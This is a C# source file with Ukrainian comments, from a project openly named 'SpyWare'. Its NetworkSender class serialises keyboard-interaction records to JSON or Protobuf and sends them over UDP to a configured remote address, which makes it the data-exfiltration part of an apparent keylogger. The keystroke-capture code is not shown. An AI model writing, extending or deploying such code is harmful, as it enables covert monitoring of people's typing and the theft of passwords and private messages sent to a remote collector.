using Newtonsoft.Json;
using ProtoBuf;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace SpyWare
{
    public class NetworkSender
    {
        private UdpClient UdpClient;
        public NetworkSender(string Address, int Port)
        {
            UdpClient = new UdpClient();
            UdpClient.Connect(new IPEndPoint(IPAddress.Parse(Address), Port));
        }
        public void SendInJSON(KeyBoardInteractionInfo keyBoardInteractionInfo)
        {
            //Виконуємо серіалізацію об'єкту у строку, а потім конвертацію у масив байтів, та передаємо у якості параметра у метод Send
            Send(Encoding.Unicode.GetBytes(JsonConvert.SerializeObject(keyBoardInteractionInfo)));
        }
        public void SendInPtotobuf(KeyBoardInteractionInfo keyBoardInteractionInfo)
        {
            //Створюємо потік
            using(MemoryStream ms = new MemoryStream())
            {
                //Виконуємо серіалізацію об'єкту у потік
                Serializer.Serialize<KeyBoardInteractionInfo>(ms, keyBoardInteractionInfo);
                //Передаємо байтовий вигляд потоку у якості параметра у метод Send
                Send(ms.ToArray());
            }
        }
        private void Send(byte[] byteObject)
        {
            UdpClient.Send(byteObject, byteObject.Length);
        }
    }
    public enum ProtocolType
    {
        JSON=0,
        ProtoBuf
    }
}
